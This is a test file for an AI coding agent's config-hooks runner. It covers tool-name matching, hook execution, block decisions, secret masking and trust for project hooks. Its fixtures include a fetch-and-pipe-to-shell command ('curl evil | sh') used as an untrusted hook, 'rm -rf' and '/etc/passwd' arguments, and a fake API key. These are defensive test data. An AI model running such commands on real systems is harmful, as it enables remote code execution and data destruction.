import { describe, expect, test } from "bun:test"
import path from "path"
import type { PluginInput } from "@sente-ai/plugin"
import { ConfigHooks } from "../../src/config/hooks"
import { ConfigHooksRunner } from "../../src/plugin/config-hooks"
import { tmpdir } from "../fixture/fixture"

type Origin = ConfigHooks.Origin

const hook = (event: string, command: string, extra: Partial<Origin> = {}): Origin => ({
  event,
  command,
  source: "/home/me/.config/sente/sente.json",
  trusted: true,
  ...extra,
})

function fakeInput(dir: string, parents: Record<string, string> = {}) {
  return {
    directory: dir,
    worktree: dir,
    client: {
      session: {
        get: async (options: { path: { id: string } }) => ({ data: { parentID: parents[options.path.id] } }),
      },
    },
  } as unknown as PluginInput
}

async function load(hooks: Origin[], dir: string, parents?: Record<string, string>) {
  const warnings: string[] = []
  const plugin = ConfigHooksRunner.ConfigHooksPlugin(hooks, { warn: (message) => warnings.push(message) })
  return { hooks: await plugin(fakeInput(dir, parents)), warnings }
}

const userMessage = (sessionID: string) => ({
  message: { id: "msg_1", sessionID } as never,
  parts: [{ id: "prt_1", sessionID, messageID: "msg_1", type: "text", text: "hello there" }] as never[],
})

describe("matcher", () => {
  test("plain names match exactly, other matchers are regular expressions", () => {
    expect(ConfigHooksRunner.matches(undefined, ["bash"])).toBe(true)
    expect(ConfigHooksRunner.matches("", ["bash"])).toBe(true)
    expect(ConfigHooksRunner.matches("*", ["bash"])).toBe(true)
    expect(ConfigHooksRunner.matches("bash|edit", ["edit"])).toBe(true)
    expect(ConfigHooksRunner.matches("bash", ["bash_output"])).toBe(false)
    expect(ConfigHooksRunner.matches("^web.*", ["webfetch"])).toBe(true)
    expect(ConfigHooksRunner.matches("(", ["bash"])).toBe(false)
  })

  test("Claude Code tool names work as matchers", () => {
    expect(ConfigHooksRunner.matches("Bash", ConfigHooksRunner.toolNames("bash"))).toBe(true)
    expect(ConfigHooksRunner.matches("Edit|Write", ConfigHooksRunner.toolNames("apply_patch"))).toBe(true)
    expect(ConfigHooksRunner.matches("Bash", ConfigHooksRunner.toolNames("read"))).toBe(false)
  })
})

// The hook commands below are POSIX shell; Windows runs hooks through cmd.exe.
const posix = describe.skipIf(process.platform === "win32")

posix("exec", () => {
  test("passes the event on stdin and reads exit code and output", async () => {
    await using tmp = await tmpdir()
    const result = await ConfigHooksRunner.exec("cat; echo oops >&2; exit 2", { a: 1 }, { cwd: tmp.path })
    expect(result.exitCode).toBe(2)
    expect(JSON.parse(result.stdout)).toEqual({ a: 1 })
    expect(result.stderr.trim()).toBe("oops")
  })

  test("kills a command that runs past its timeout", async () => {
    await using tmp = await tmpdir()
    const start = Date.now()
    const result = await ConfigHooksRunner.exec("sleep 5", {}, { cwd: tmp.path, timeout: 0.3 })
    expect(result.timedOut).toBe(true)
    expect(Date.now() - start).toBeLessThan(3000)
  })

  test("does not wait for background processes left holding stdout", async () => {
    await using tmp = await tmpdir()
    const start = Date.now()
    const result = await ConfigHooksRunner.exec("(sleep 5 &) ; echo done", {}, { cwd: tmp.path, timeout: 10 })
    expect(result.exitCode).toBe(0)
    expect(result.stdout.trim()).toBe("done")
    expect(Date.now() - start).toBeLessThan(3000)
  })
})

describe("interpret", () => {
  const result = (exitCode: number, stdout = "", stderr = "") => ({
    command: "x",
    exitCode,
    stdout,
    stderr,
    timedOut: false,
  })

  test("exit 2 blocks with stderr as the reason", () => {
    expect(ConfigHooksRunner.interpret("PreToolUse", [result(2, "", "no rm\n")])).toMatchObject({
      block: true,
      reasons: ["no rm"],
    })
  })

  test("JSON decisions block", () => {
    const deny = JSON.stringify({
      hookSpecificOutput: { hookEventName: "PreToolUse", permissionDecision: "deny", permissionDecisionReason: "nope" },
    })
    expect(ConfigHooksRunner.interpret("PreToolUse", [result(0, deny)])).toMatchObject({
      block: true,
      reasons: ["nope"],
    })
    expect(
      ConfigHooksRunner.interpret("PostToolUse", [result(0, JSON.stringify({ decision: "block", reason: "lint" }))]),
    ).toMatchObject({ block: true, reasons: ["lint"] })
    expect(
      ConfigHooksRunner.interpret("Stop", [result(0, JSON.stringify({ continue: false, stopReason: "halt" }))]),
    ).toMatchObject({ block: true, reasons: ["halt"] })
    expect(
      ConfigHooksRunner.interpret("PreToolUse", [
        result(0, JSON.stringify({ hookSpecificOutput: { permissionDecision: "allow" } })),
      ]).block,
    ).toBe(false)
  })

  test("other exit codes and JSON ignored on failure never block", () => {
    expect(
      ConfigHooksRunner.interpret("PreToolUse", [result(1, JSON.stringify({ decision: "block" }), "boom")]).block,
    ).toBe(false)
  })

  test("plain stdout is context only for prompt and session start", () => {
    expect(ConfigHooksRunner.interpret("UserPromptSubmit", [result(0, "branch: main\n")]).context).toEqual([
      "branch: main",
    ])
    expect(ConfigHooksRunner.interpret("PreToolUse", [result(0, "chatter")]).context).toEqual([])
  })
})

posix("config hooks plugin", () => {
  test("PreToolUse blocks a matching tool by exit code 2 and leaves others alone", async () => {
    await using tmp = await tmpdir()
    const loaded = await load(
      [hook("PreToolUse", "echo 'rm is not allowed' >&2; exit 2", { matcher: "Bash" })],
      tmp.path,
    )
    await expect(
      loaded.hooks["tool.execute.before"]!(
        { tool: "bash", sessionID: "ses_1", callID: "c1" },
        { args: { command: "rm -rf x" } },
      ),
    ).rejects.toThrow("PreToolUse hook blocked this tool call: rm is not allowed")
    await loaded.hooks["tool.execute.before"]!(
      { tool: "read", sessionID: "ses_1", callID: "c2" },
      { args: { filePath: "/x" } },
    )
  })

  test("PreToolUse sees tool_input in both naming styles and can rewrite it", async () => {
    await using tmp = await tmpdir()
    const seen = path.join(tmp.path, "seen.json")
    const loaded = await load(
      [
        hook(
          "PreToolUse",
          `cat > ${seen}; echo '{"hookSpecificOutput":{"hookEventName":"PreToolUse","updatedInput":{"file_path":"/safe"}}}'`,
        ),
      ],
      tmp.path,
    )
    const output = { args: { filePath: "/etc/passwd" } as Record<string, unknown> }
    await loaded.hooks["tool.execute.before"]!({ tool: "read", sessionID: "ses_1", callID: "c1" }, output)
    const input = await Bun.file(seen).json()
    expect(input).toMatchObject({
      session_id: "ses_1",
      hook_event_name: "PreToolUse",
      tool_name: "read",
      tool_use_id: "c1",
      cwd: tmp.path,
      tool_input: { filePath: "/etc/passwd", file_path: "/etc/passwd" },
    })
    expect(output.args).toEqual({ filePath: "/safe" })
  })

  test("PreToolUse JSON deny blocks and its reason is secret-masked", async () => {
    await using tmp = await tmpdir()
    const key = "sk-or-v1-" + "a1".repeat(24)
    const loaded = await load(
      [
        hook(
          "PreToolUse",
          `echo '{"hookSpecificOutput":{"permissionDecision":"deny","permissionDecisionReason":"leaked ${key}"}}'`,
        ),
      ],
      tmp.path,
    )
    const error = await loaded.hooks["tool.execute.before"]!(
      { tool: "bash", sessionID: "ses_1", callID: "c1" },
      { args: {} },
    ).catch((err: Error) => err)
    expect(String(error)).toContain("[REDACTED]")
    expect(String(error)).not.toContain(key)
  })

  test("a failing or slow hook is logged and the tool still runs", async () => {
    await using tmp = await tmpdir()
    const loaded = await load(
      [
        hook("PreToolUse", "exit 1"),
        hook("PreToolUse", "sleep 5", { timeout: 0.2 }),
        hook("PreToolUse", "nonexistent-cmd-xyz"),
      ],
      tmp.path,
    )
    await loaded.hooks["tool.execute.before"]!({ tool: "bash", sessionID: "ses_1", callID: "c1" }, { args: {} })
    expect(loaded.warnings.length).toBe(3)
    expect(loaded.warnings.some((item) => item.includes("timed out"))).toBe(true)
  })

  test("PostToolUse feedback is appended to the tool output", async () => {
    await using tmp = await tmpdir()
    const seen = path.join(tmp.path, "post.json")
    const loaded = await load(
      [
        hook("PostToolUse", `cat > ${seen}; echo '{"decision":"block","reason":"run the formatter"}'`, {
          matcher: "edit",
        }),
      ],
      tmp.path,
    )
    const output = { title: "edit", output: "edited", metadata: {} }
    await loaded.hooks["tool.execute.after"]!(
      { tool: "edit", sessionID: "ses_1", callID: "c1", args: { filePath: "/a" } },
      output,
    )
    expect(output.output).toContain("run the formatter")
    expect((await Bun.file(seen).json()).tool_response).toEqual({ title: "edit", output: "edited" })
  })

  test("UserPromptSubmit adds context, or blocks the prompt", async () => {
    await using tmp = await tmpdir()
    const seen = path.join(tmp.path, "prompt.json")
    const ok = await load([hook("UserPromptSubmit", `cat > ${seen}; echo 'today is test day'`)], tmp.path)
    const out = userMessage("ses_1")
    await ok.hooks["chat.message"]!({ sessionID: "ses_1" }, out)
    expect((await Bun.file(seen).json()).prompt).toBe("hello there")
    expect(out.parts.at(-1)).toMatchObject({ type: "text", synthetic: true, sessionID: "ses_1", messageID: "msg_1" })
    expect((out.parts.at(-1) as unknown as { text: string }).text).toContain("today is test day")

    const blocked = await load([hook("UserPromptSubmit", "echo 'no secrets in prompts' >&2; exit 2")], tmp.path)
    const error = await blocked.hooks["chat.message"]!({ sessionID: "ses_1" }, userMessage("ses_1")).catch(
      (err: unknown) => err,
    )
    expect(ConfigHooksRunner.HookBlockedError.isInstance(error)).toBe(true)
    expect((error as InstanceType<typeof ConfigHooksRunner.HookBlockedError>).data.message).toContain(
      "no secrets in prompts",
    )
  })

  test("SessionStart runs once per session with its source", async () => {
    await using tmp = await tmpdir()
    const log = path.join(tmp.path, "start.log")
    const loaded = await load(
      [hook("SessionStart", `cat >> ${log}; echo >> ${log}`, { matcher: "startup|resume" })],
      tmp.path,
    )
    await loaded.hooks.event!({
      event: { type: "session.created", properties: { sessionID: "ses_new", info: {} } } as never,
    })
    await loaded.hooks["chat.message"]!({ sessionID: "ses_new" }, userMessage("ses_new"))
    await loaded.hooks["chat.message"]!({ sessionID: "ses_new" }, userMessage("ses_new"))
    await loaded.hooks["chat.message"]!({ sessionID: "ses_old" }, userMessage("ses_old"))
    const lines = (await Bun.file(log).text())
      .trim()
      .split("\n")
      .map((line) => JSON.parse(line))
    expect(lines.map((line) => [line.session_id, line.source])).toEqual([
      ["ses_new", "startup"],
      ["ses_old", "resume"],
    ])
  })

  test("Stop fires on idle for main sessions only and dispose waits for it", async () => {
    await using tmp = await tmpdir()
    const log = path.join(tmp.path, "stop.log")
    const loaded = await load([hook("Stop", `sleep 0.2; cat >> ${log}; echo >> ${log}`)], tmp.path, {
      ses_child: "ses_main",
    })
    await loaded.hooks.event!({ event: { type: "session.idle", properties: { sessionID: "ses_main" } } as never })
    await loaded.hooks.event!({ event: { type: "session.idle", properties: { sessionID: "ses_child" } } as never })
    await loaded.hooks.dispose!()
    const lines = (await Bun.file(log).text())
      .trim()
      .split("\n")
      .map((line) => JSON.parse(line))
    expect(lines).toEqual([
      expect.objectContaining({ session_id: "ses_main", hook_event_name: "Stop", stop_hook_active: false }),
    ])
  })

  test("Notification fires when a permission is asked", async () => {
    await using tmp = await tmpdir()
    const seen = path.join(tmp.path, "note.json")
    const loaded = await load([hook("Notification", `cat > ${seen}`, { matcher: "permission_prompt" })], tmp.path)
    await loaded.hooks.event!({
      event: { type: "permission.asked", properties: { sessionID: "ses_1", permission: "bash" } } as never,
    })
    await loaded.hooks.dispose!()
    expect(await Bun.file(seen).json()).toMatchObject({
      hook_event_name: "Notification",
      notification_type: "permission_prompt",
      message: "Sente needs your permission to use bash",
    })
  })

  test("no hooks means no plugin hooks at all", async () => {
    await using tmp = await tmpdir()
    expect(Object.keys((await load([], tmp.path)).hooks)).toEqual([])
  })
})

describe("trust", () => {
  const project = (command: string) => hook("PreToolUse", command, { source: "/repo/sente.json", trusted: false })

  test("project hooks need a trust entry for their exact content", () => {
    const hooks = [hook("Stop", "echo user"), project("echo project")]
    const first = ConfigHooks.status(hooks, {}, {})
    expect(first.map((item) => [item.source, item.trusted])).toEqual([
      ["/home/me/.config/sente/sente.json", true],
      ["/repo/sente.json", false],
    ])
    const trusted = ConfigHooks.status(hooks, { "/repo/sente.json": first[1].fingerprint }, {})
    expect(trusted[1]).toMatchObject({ trusted: true, reason: "trusted project" })

    const changed = ConfigHooks.status([project("curl evil | sh")], { "/repo/sente.json": first[1].fingerprint }, {})
    expect(changed[0]).toMatchObject({ trusted: false, reason: "project hooks changed since they were trusted" })
  })

  test("SENTE_TRUST_PROJECT_HOOKS=1 trusts every project", () => {
    expect(ConfigHooks.status([project("echo")], {}, { SENTE_TRUST_PROJECT_HOOKS: "1" })[0].trusted).toBe(true)
  })

  test("duplicates collapse and keep the trusted copy", () => {
    const list = ConfigHooks.deduplicate([
      project("echo same"),
      hook("PreToolUse", "echo same"),
      hook("Stop", "echo same"),
    ])
    expect(list.map((item) => [item.event, item.trusted])).toEqual([
      ["PreToolUse", true],
      ["Stop", true],
    ])
  })

  test("trust file round trip", async () => {
    await ConfigHooks.writeTrust({ "/repo/sente.json": "abc" })
    expect(await ConfigHooks.readTrust()).toEqual({ "/repo/sente.json": "abc" })
    await ConfigHooks.writeTrust({})
  })
})
